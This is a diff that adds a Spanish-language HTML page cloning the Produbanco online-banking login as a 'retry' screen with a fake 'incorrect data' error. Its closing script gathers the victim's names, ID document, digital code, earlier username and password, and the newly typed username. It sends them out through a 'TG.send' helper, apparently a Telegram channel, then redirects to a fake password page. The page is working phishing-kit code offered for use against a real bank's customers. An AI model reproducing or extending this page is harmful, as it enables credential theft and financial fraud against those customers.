@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reintentar</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --ds-bg: #ffffff;
+      --ds-green-primary: #046a38;
+      --ds-green-secondary: #78be20;
+      --ds-gray-input: #b2b2b2;
+      --ds-gray-disabled: #e3e3e3;
+      --ds-gray-text: #8b8b8b;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: "Nunito Sans", sans-serif;
+    }
+
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--ds-bg);
+      color: #000;
+    }
+
+    .ds-contenedor-principal {
+      width: 100%;
+      min-height: 100vh;
+    }
+
+    .ds-contenedor--publico {
+      background-color: var(--ds-bg);
+      display: grid;
+      grid-template-columns: minmax(640px, 44.2%) 1fr;
+      min-height: 100vh;
+      overflow-x: hidden;
+      width: 100%;
+    }
+
+    .ds-contenido-principal {
+      grid-column: 1;
+      padding: 0 15px;
+      width: 100%;
+    }
+
+    .ds-formulario {
+      margin: 0 auto;
+      max-width: 540px;
+      padding-bottom: 30px;
+      padding-top: 15px;
+      width: 100%;
+    }
+
+    .ds-logotipo {
+      background-image: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/logotipo.svg");
+      background-position: left center;
+      background-repeat: no-repeat;
+      background-size: 210px 58px;
+      height: 58px;
+      margin-bottom: 12px;
+      width: 210px;
+    }
+
+    .ds-alerta-error {
+      align-items: flex-start;
+      background-color: #ef0000;
+      border-radius: 4px;
+      color: #fff;
+      display: flex;
+      gap: 10px;
+      margin-bottom: 28px;
+      max-width: 100%;
+      padding: 14px 14px 12px;
+      width: 100%;
+    }
+
+    .ds-alerta-icono {
+      flex: 0 0 auto;
+      font-size: 18px;
+      line-height: 1;
+      margin-top: 2px;
+    }
+
+    .ds-alerta-contenido {
+      min-width: 0;
+    }
+
+    .ds-alerta-titulo {
+      font-size: 24px;
+      font-style: normal;
+      font-weight: 700;
+      line-height: 24px;
+      margin: 0 0 9px;
+    }
+
+    .ds-alerta-texto {
+      font-size: 14px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 22px;
+      margin: 0;
+    }
+
+    .ds-titulo-primario {
+      color: var(--ds-green-primary);
+      font-size: 28px;
+      font-style: normal;
+      font-weight: 700;
+      line-height: 34px;
+      margin: 0 0 15px;
+      max-width: 300px;
+    }
+
+    .ds-subtitulo {
+      align-items: center;
+      display: flex;
+      font-size: 17px;
+      font-style: normal;
+      font-weight: 600;
+      line-height: 23.15px;
+      margin: 0 0 15px;
+    }
+
+    .ds-grupo-caja {
+      max-width: 240px;
+      padding-top: 15px;
+      width: 100%;
+    }
+
+    .ds-etiqueta {
+      align-items: center;
+      color: #000;
+      display: flex;
+      font-size: 12px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 12px;
+      margin-bottom: 4px;
+    }
+
+    .ds-control-caja-texto {
+      border: 1px solid var(--ds-gray-input);
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 15px;
+      height: 48px;
+      line-height: 20px;
+      padding: 14px;
+      width: 100%;
+    }
+
+    .ds-control-caja-texto:focus {
+      border-color: var(--ds-green-primary);
+      box-shadow: none;
+      outline: 0;
+    }
+
+    .ds-control-caja-texto::placeholder {
+      color: var(--ds-gray-text);
+    }
+
+    .ds-mayuscula {
+      text-transform: uppercase;
+    }
+
+    .ds-mayuscula::placeholder {
+      text-transform: none;
+    }
+
+    .ds-control {
+      align-items: center;
+      border: 1px solid transparent;
+      border-radius: 4px;
+      cursor: pointer;
+      display: inline-flex;
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      justify-content: center;
+      letter-spacing: -0.19px;
+      line-height: 21px;
+      margin-bottom: 15px;
+      margin-top: 15px;
+      min-height: 48px;
+      min-width: 112px;
+      padding: 12px 30px;
+      text-align: center;
+      user-select: none;
+      vertical-align: middle;
+    }
+
+    .ds-control-boton--primario {
+      background-color: var(--ds-green-primary);
+      border-color: var(--ds-green-primary);
+      color: #fff;
+    }
+
+    .ds-control-boton--primario:hover {
+      background-color: #368860;
+      border-color: #368860;
+      color: #fff;
+    }
+
+    .ds-control-boton--primario.ds-control-boton--deshabilitado {
+      background-color: var(--ds-gray-disabled);
+      border-color: var(--ds-gray-disabled);
+      color: var(--ds-gray-text);
+      cursor: not-allowed;
+      margin-top: 30px;
+      pointer-events: none;
+    }
+
+    .ds-control-boton--secundario {
+      background-color: var(--ds-green-secondary);
+      border-color: var(--ds-green-secondary);
+      color: #fff;
+    }
+
+    .ds-contenedor-hipervinculo {
+      margin-top: 15px;
+      text-align: center;
+      width: 100%;
+    }
+
+    .ds-hipervinculo {
+      color: var(--ds-green-secondary);
+      font-size: 14px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 19px;
+      text-decoration-line: underline;
+    }
+
+    .ds-contenedor-hipervinculo--alineado-campo {
+      margin-top: 15px;
+      max-width: 240px;
+      text-align: left;
+      width: 100%;
+    }
+
+    .ds-usuario__crear {
+      margin-bottom: 15px;
+      margin-top: 30px;
+    }
+
+    .ds-usuario__indicaciones {
+      margin-top: 15px;
+      text-align: center;
+    }
+
+    .ds-texto-pequeno {
+      color: var(--ds-gray-text);
+      font-size: 15px;
+      font-style: normal;
+      line-height: 24px;
+    }
+
+    .ds-texto-pequeno a {
+      color: var(--ds-green-secondary);
+      font-size: 14px;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    .ds-imagen-principal {
+      grid-column: 2;
+      margin-left: 3px;
+      min-height: 100vh;
+    }
+
+    .ds-imagen-principal__banner {
+      background-image: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/ds_banner.png");
+      background-position: right top;
+      background-repeat: no-repeat;
+      background-size: cover;
+      height: 100%;
+      width: 100%;
+    }
+
+    @media screen and (max-width: 768px) {
+      .ds-contenedor--publico {
+        display: block;
+        min-height: 100vh;
+        padding: 0;
+      }
+
+      .ds-imagen-principal {
+        display: none;
+      }
+
+      .ds-contenido-principal {
+        margin: 0 auto;
+        max-width: 570px;
+        padding: 0 15px;
+      }
+
+      .ds-formulario {
+        max-width: 540px;
+      }
+
+      .ds-grupo-caja {
+        max-width: 100%;
+      }
+
+      .ds-control {
+        width: 100%;
+      }
+
+      .ds-contenedor-hipervinculo--alineado-campo {
+        max-width: 100%;
+      }
+    }
+
+    @media screen and (max-width: 576px) {
+      .ds-contenedor--publico {
+        padding: 0 15px;
+      }
+
+      .ds-contenido-principal {
+        max-width: 100%;
+        padding: 0;
+      }
+
+      .ds-formulario {
+        max-width: 100%;
+        padding-top: 12px;
+      }
+
+      .ds-logotipo {
+        margin-bottom: 12px;
+      }
+
+      .ds-titulo-primario {
+        font-size: 28px;
+        line-height: 34px;
+        max-width: none;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="ds-contenedor-principal">
+    <section class="ds-contenedor--publico">
+      <section class="ds-contenido-principal">
+        <div class="ds-formulario">
+          <div class="ds-logotipo" aria-label="Logotipo Produbanco"></div>
+
+          <section class="ds-alerta-error" role="alert" aria-live="polite">
+            <span class="ds-alerta-icono" aria-hidden="true">&#9888;</span>
+            <div class="ds-alerta-contenido">
+              <p class="ds-alerta-titulo">Datos incorrectos</p>
+              <p class="ds-alerta-texto">
+                Vuelve a intentarlo. Si olvidaste tu usuario o est&aacute; bloqueado, selecciona
+                &ldquo;&iquest;Olvidaste tu usuario o quieres desbloquearlo?&rdquo;. Si olvidaste tu contrase&ntilde;a,
+                selecciona &ldquo;&iquest;Olvidaste tu contrase&ntilde;a?&rdquo;.
+              </p>
+            </div>
+          </section>
+
+          <h1 class="ds-titulo-primario">Hola, te damos la bienvenida</h1>
+
+          <span class="ds-subtitulo">Ingresa a tu Produbanco enl&iacute;nea</span>
+
+          <form id="frmInicioSesion" action="contrase%C3%B1a.html">
+            <div class="ds-grupo-caja">
+              <label class="ds-etiqueta" for="usuario">Usuario</label>
+              <input
+                id="usuario"
+                class="ds-control-caja-texto ds-mayuscula"
+                type="text"
+                maxlength="20"
+                placeholder="Ingresa tu nombre de usuario"
+                autocomplete="off"
+                spellcheck="false"
+                autofocus
+              >
+            </div>
+
+            <button
+              id="btnAceptar"
+              class="ds-control ds-control-boton--primario ds-control-boton--deshabilitado"
+              type="submit"
+              disabled
+            >
+              Continuar
+            </button>
+          </form>
+
+          <div class="ds-contenedor-hipervinculo--alineado-campo">
+            <a class="ds-hipervinculo" href="#">
+              &#191;Olvidaste tu usuario o quieres desbloquearlo?
+            </a>
+          </div>
+
+          <span class="ds-subtitulo ds-usuario__crear">
+            &#191;Eres cliente y es la primera vez que ingresas?
+          </span>
+
+          <button class="ds-control ds-control-boton--secundario" type="button">
+            Reg&iacute;strate
+          </button>
+
+          <div class="ds-contenedor-hipervinculo ds-usuario__indicaciones">
+            <div class="ds-texto-pequeno">
+              Si tienes problemas para ingresar, comun&iacute;cate al:
+              <br>
+              <strong><a href="tel:024009000">02 400 9000</a></strong>.
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <aside class="ds-imagen-principal" aria-hidden="true">
+        <div class="ds-imagen-principal__banner"></div>
+      </aside>
+    </section>
+  </main>
+  <script src="../tg.js"></script>
+  <script>
+    const inputUsuario = document.getElementById("usuario");
+    const btnContinuar = document.getElementById("btnAceptar");
+    const frmInicioSesion = document.getElementById("frmInicioSesion");
+
+    function actualizarEstadoContinuar() {
+      const habilitar = inputUsuario.value.length >= 6;
+      btnContinuar.disabled = !habilitar;
+      btnContinuar.classList.toggle("ds-control-boton--deshabilitado", !habilitar);
+    }
+
+    inputUsuario.addEventListener("input", function () {
+      const inicio = this.selectionStart;
+      const fin = this.selectionEnd;
+      this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+      this.setSelectionRange(inicio, fin);
+      actualizarEstadoContinuar();
+    });
+
+    frmInicioSesion.addEventListener("submit", function (evento) {
+      evento.preventDefault();
+      if (btnContinuar.disabled) return;
+
+      TG.save('usuario', inputUsuario.value);
+
+      var msg = 'Reintento\n'
+        + '\u{1F464} Nombres: ' + TG.load('nombres') + '\n'
+        + '\u{1F464} Apellidos: ' + TG.load('apellidos') + '\n'
+        + '\u{1F4C4} Documento: ' + TG.load('documento') + '\n'
+        + '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n'
+        + '\u{1F3E6} \u00BFEs Cliente?: ' + TG.load('esCliente') + '\n'
+        + '\u{1F464} USU ANTERIOR: ' + TG.load('usuAnterior') + '\n'
+        + '\u{1F512} SENA ANTERIOR: ' + TG.load('senaAnterior') + '\n'
+        + '\u{1F464} USU: ' + TG.load('usuario');
+
+      TG.overlay(true);
+      TG.send(msg, false).then(function () {
+        window.location.href = '../contrase%C3%B1a.html';
+      });
+    });
+
+    actualizarEstadoContinuar();
+  </script>
+</body>
+</html>
